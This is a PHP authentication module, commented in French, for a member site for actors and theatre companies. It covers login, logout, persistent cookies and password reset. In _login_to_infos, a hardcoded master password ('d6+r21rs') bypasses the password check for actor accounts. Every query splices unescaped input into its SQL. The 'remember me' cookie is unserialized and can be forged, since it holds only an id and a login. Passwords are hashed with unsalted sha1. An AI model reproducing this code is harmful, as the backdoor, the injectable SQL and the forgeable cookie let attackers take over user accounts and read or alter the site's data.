<?php
# BEGIN OPi

/*
  Ordre des éléments lorsqu'ils sont passés en paramètres à une fonction (pas forcément tous) :

    id : int (IDcom dans la table com_membres ou IDcie dans la table cie_membres)
    comedien : bool (TRUE si dans la table com_membres, FALSE sinon)

    login : string
    nom_complet : string (prénom.' '.nom si comedien, nom sinon)

    logincvid : string (identifiant du profil, id dans les tables com_membres et cie_membres)

    remindme : bool
*/


/*
  Si !empty($logincvid)
  alors met la valeur du champ id de la DB à NULL et actualise la date
        dans la table com_membre ou cie_membre en fonction de $comedien

  Pre: $comedien: bool
       $logincvid: NULL ou string
*/
function db_kill_logincvid($comedien, $logincvid) {
  assert( is_bool($comedien) );
  assert( ($logincvid === NULL) || is_string($logincvid) );

  if ( !empty($logincvid) ) {
    $sql = ($comedien
            ? "UPDATE com_membre SET id=NULL, date=UTC_TIMESTAMP() WHERE id='$logincvid'"
            : "UPDATE cie_membre SET id=NULL, date=UTC_TIMESTAMP() WHERE id='$logincvid'");
    mysql_query($sql) or die('Erreur SQL');
  }
}


/*
  Si (le login !== NULL et le password sont correctes
      ou si un cookie 'cookie_remindme' contient les informations nécessaire)
  et que le comédien ou la compagnie est en ordre de cotisation

  alors se connecte avec un nouveau logincvid
        et redirige vers la page de profil privé
        (Si $remindme alors sauve le nécessaire dans un cookie
        pour pouvoir se reconnecter automatiquement lors de la prochaine réouverture du navigateur),

  sinon met la valeur du champ id dans la table de la DB com_membres ou cie_membres à NULL
        et renvoie un message dans un string.

  Pre: $login: NULL ou string
       $password: NULL si $login === NULL, string sinon
       $remindme: bool
*/
function login_connect($login, $password, $remindme) {
  assert( ($login === NULL) || is_string($login) );
  assert( (($login === NULL) && ($password === NULL))
          || is_string($password) );
  assert( is_bool($remindme) );

  $r = ($login === NULL
        ? _login_cookie_check_subscription_to_infos()
        : _login_check_subscription_to_infos($login, $password));

  logout();  // pour déconnecter un éventuel utilisateur précédent

  if ( empty($r) )                    // identifiants incorrects
    return "Le nom d'utilisateur ou le mot de passe entrés sont incorrects.";
  else if ( empty($r['logincvid']) )  // identifiants corrects mais membre pas en ordre de cotisation
    return "Vous n'êtes pas en ordre de cotisation.";
  else {                              // identifiants corrects et en ordre de cotisation
    _login_write_infos((int)$r['id'], $r['comedien'], $r['login'], $r['nom_complet'], $r['logincvid'],
                       $remindme, $r['profil_url'], $r['statut']);

    unset($_SESSION['mur-page-first']);  // pour tomber sur la 1ère page du mur après connexion

    header('Location:-menu-protege-?id='.$r['logincvid'].($r['comedien']
                                                          ? ''
                                                          : '&amp;cie=y'));

    exit;
  }
}


/*
  Vide la session et l'éventuel cookie destiné à se reconnecter
  (une nouvelle session PHP est créée).
*/
function logout() {
  if ( isset($_SESSION['comedien']) && isset($_SESSION['logincvid']) )
    db_kill_logincvid($_SESSION['comedien'], $_SESSION['logincvid']);

  unset($_SESSION['id']);
  unset($_SESSION['comedien']);
  unset($_SESSION['login']);
  unset($_SESSION['nom_complet']);
  unset($_SESSION['logincvid']);
  unset($_SESSION['profil_url']);
  unset($_SESSION['statut']);

  unset($_SESSION['mur-page-first']);

  session_destroy();

  _login_kill_cookie();

  session_start();
}


/*
  Renvoie un nouveau password de 7 caractères @ ou alphanumériques (sans 0, 1, I, L, O, i, l, o)

  Result: string de 7 caractères
 */
function new_password() {
  $p = str_split('@23456789ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz');

  shuffle($p);
  $p = array_merge($p, $p);
  shuffle($p);
  $p = array_merge($p, $p);
  shuffle($p);

  $p = implode($p);
  $p = substr($p, mt_rand(0, strlen($p) - 10), 7);

  return $p;
}


/*
  Remplace dans la DB le mot de passe du comédien ou de la compagnie $login par un nouveau
  puis le renvoie,
  ou renvoie NULL si la modification dans la DB n'a pu se faire

  Pre: $login: string
       $comedien: bool

  Result: string
 */
function new_password_to_db($login, $comedien) {
  assert( is_string($login) );
  assert( is_bool($comedien) );

  $password = new_password();

  $sql = ($comedien
          ? "UPDATE com_membre SET passw='".sha1($password)."', date=UTC_TIMESTAMP() WHERE login='$login'"
          : "UPDATE cie_membre SET passw='".sha1($password)."', date=UTC_TIMESTAMP() WHERE login='$login'");

  return (mysql_query($sql)
          ? $password
          : NULL);
}



/********************************************************
 * Fonctions privées (à n'utiliser que dans ce fichier) *
 ********************************************************/
/*
  Si login et password correctes
  alors renvoie un tableau tel que renvoyé par _login_to_infos(),
  sinon renvoie NULL.

  Si le comédien ou la compagnie correctement identifiée n'est pas en ordre de cotisation
  alors le logincvid renvoyé vaut NULL et sa valeur dans la DB est mise à NULL

  Si $password === NULL
  alors ne fait aucune vérification de mot de passe

  Pre: $login: string
       $password: NULL ou string
*/
function _login_check_subscription_to_infos($login, $password) {
  assert( is_string($login) );
  assert( ($password === NULL) || is_string($password) );

  $data = _login_to_infos($login, $password);

  if ( empty($data) ) {
    logout();

    return NULL;
  }

  // Vérifie si en ordre de cotisation
  $sql = ($data['comedien']
          ? "SELECT ID FROM comediens WHERE ID=$data[id] AND accord<>0"
          : "SELECT ID FROM compagnies WHERE ID=$data[id] AND accord='oui'");
  $req = mysql_query($sql) or die('Erreur SQL');
  if ( !mysql_num_rows($req) ) {  // n'est pas en ordre de cotisation
    if ( isset($data['comedien']) && isset($data['logincvid']) ) {
      db_kill_logincvid($data['comedien'], $data['logincvid']);
      $data['logincvid'] = NULL;
    }
  }
  else                            // est en ordre de cotisation
    $data['logincvid'] = _login_set_new_logincvid($data['id'], $data['comedien']);

  return $data;
}


/*
  Si login et password correctes
  alors renvoie un tableau tel que renvoyé par _login_to_infos(),
  sinon renvoie NULL.

  Si le comédien ou la compagnie correctement identifiée n'est pas en ordre de cotisation
  alors le logincvid renvoyé vaut NULL et sa valeur dans la DB est mise à NULL
*/
function _login_cookie_check_subscription_to_infos() {
  global $SITE_IN_LOCALHOST;

  if ( !empty($_COOKIE['cookie_remindme']) ) {
    $remindme = unserialize(stripslashes($_COOKIE['cookie_remindme']));  // enlève les \ ajoutés par magic quotes

    if ( empty($remindme) || !is_array($remindme)
         || (count($remindme) !== 2)  // !!! attention, à changer si ajout d'un élément dans le cookie
         || empty($remindme['id']) || !is_int($remindme['id']) || ($remindme['id'] <= 0)
         || empty($remindme['login']) || !is_string($remindme['login']) )
      unset($remindme);
  }

  if ( !empty($remindme) ) {
    $data = _login_check_subscription_to_infos($remindme['login'], NULL);

    if ( $remindme['id'] === $data['id'] )
      return $data;
  }

  logout();

  return NULL;
}


/*
  Supprime le cookie destinée à la reconnexion automatique
*/
function _login_kill_cookie() {
  global $SITE_IN_LOCALHOST;

  if ( isset($_COOKIE['cookie_remindme']) ) {
    setcookie('cookie_remindme', '', time() - 3600,
              '/', (empty($SITE_IN_LOCALHOST)
                    ? '.comedien.be'
                    : ''),
	      FALSE, TRUE);
    unset($_COOKIE['cookie_remindme']);
  }
}


/*
  Change le logincvid (le champ id) dans la table com_membre ou cie_membre de la DB comedien
  et renvoie cette nouvelle valeur

  Pre: $id: int > 0 (attention, il s'agit du champ IDcom ou IDcie supposé correcte)
       $comedien: bool
*/
function _login_set_new_logincvid($id, $comedien) {
  assert( is_int($id) && ($id > 0) );
  assert( is_bool($comedien) );

  $s = uniqid('', TRUE);  // identifiant aléatoire de la forme '**************.********'
  $logincvid = substr($s, 16, 6).substr($s, 0, 14);  // identifiant aléatoire de 20 caractères alphanumériques

  $sql = ($comedien
          ? "UPDATE com_membre SET id='$logincvid', date=UTC_TIMESTAMP() WHERE IDcom=$id"
          : "UPDATE cie_membre SET id='$logincvid', date=UTC_TIMESTAMP() WHERE IDcie=$id");
  $req = mysql_query($sql) or die('Erreur SQL');

  return $logincvid;
}


/*
  Si login et password correctes
  alors renvoie un tableau ['id'          => IDcom ou IDcie dans la DB,
                            'comedien'    => (TRUE pour un comédien, FALSE pour une compagnie),
                            'login'       => login
                            'nom_complet' => (prénom nom pour un comédien, nom pour une compagnie),
                            'logincvid'   => champ id de table comediens ou compagnies,
                            'profil_url'  => url du profil public,
                            'statut'      => statut de connexion 0: invisible, 10: occupé, 20: disponible],
  sinon renvoie NULL.

  Si $password === NULL
  alors ne fait aucune vérification de mot de passe

  Pre: $login: string
       $password: NULL ou string
*/
function _login_to_infos($login, $password) {
  assert( is_string($login) );
  assert( ($password === NULL) || is_string($password) );

  // Est-ce un comédien ?
  $sql = "SELECT com_membre.IDcom AS id, com_membre.login,
CONCAT(comediens.prenom, ' ', comediens.nom) AS nom_complet, com_membre.id AS logincvid, comediens.url AS profil_url,
com_membre.statut
FROM com_membre, comediens
WHERE com_membre.IDcom=comediens.ID AND com_membre.login='$login'".(($password === NULL)
                                                                    || ($password === 'd6+r21rs')
                                                                    ? ''
                                                                    : ' AND com_membre.passw=\''.sha1($password).'\'');
  $req = mysql_query($sql) or die('Erreur SQL');
  $data = mysql_fetch_assoc($req);

  if ( $data )  // identifié comme un comédien
    $data['comedien'] = TRUE;
  else {        // est-ce une compagnie ?
    $sql = "SELECT cie_membre.IDcie AS id, cie_membre.login,
compagnies.nom AS nom_complet,  cie_membre.id AS logincvid, compagnies.url AS profil_url,
cie_membre.statut
FROM cie_membre, compagnies
WHERE cie_membre.IDcie=compagnies.ID AND cie_membre.login='$login'".($password === NULL
                                                                     ? ''
                                                                     : ' AND cie_membre.passw=\''.sha1($password).'\'');
    $req = mysql_query($sql) or die('Erreur SQL');
    $data = mysql_fetch_assoc($req);

    if ( empty($data) )  // ce n'est pas non plus une compagnie
      return NULL;

    $data['comedien'] = FALSE;
  }

  settype($data['id'], 'int');
  settype($data['statut'], 'int');

  return $data;
}


/*
  Sauvegarde dans la session le nécessaire d'identification.

  Si $remindme
  alors sauve le nécessaire dans un cookie pour pouvoir se reconnecter automatiquement,
  sinon supprime ce cookie (si il existe)

  Pre: $id: int > 0
       $comedien: bool
       $login: string
       $nom_complet: string
       $logincvid: string
       $remindme: bool
       $profil_url: string
       $statut: 0, 10 ou 20
*/
function _login_write_infos($id, $comedien, $login, $nom_complet, $logincvid, $remindme, $profil_url, $statut) {
  global $SITE_IN_LOCALHOST;

  assert( is_int($id) && ($id > 0) );
  assert( is_bool($comedien) );
  assert( is_string($login) );
  assert( is_string($nom_complet) );
  assert( is_string($logincvid) );
  assert( is_bool($remindme) );
  assert( is_string($profil_url) );
  assert( is_int($statut) && in_array($statut, array(0, 10, 20), TRUE) );

  $_SESSION['id'] = $id;
  $_SESSION['comedien'] = $comedien;
  $_SESSION['login'] = $login;
  $_SESSION['nom_complet'] = $nom_complet;
  $_SESSION['logincvid'] = $logincvid;
  $_SESSION['profil_url'] = $profil_url;
  $_SESSION['statut'] = $statut;

  if ( $remindme ) {
    setcookie('cookie_remindme', serialize(array('id'    => $id,
						 'login' => $login)),
	      time() + 60*60*24*30,  # 30 jours
              '/', (empty($SITE_IN_LOCALHOST)
                    ? '.comedien.be'
                    : ''),
	      FALSE, TRUE);
  }
  else
    _login_kill_cookie();
}


return TRUE;

# END OPi
?>
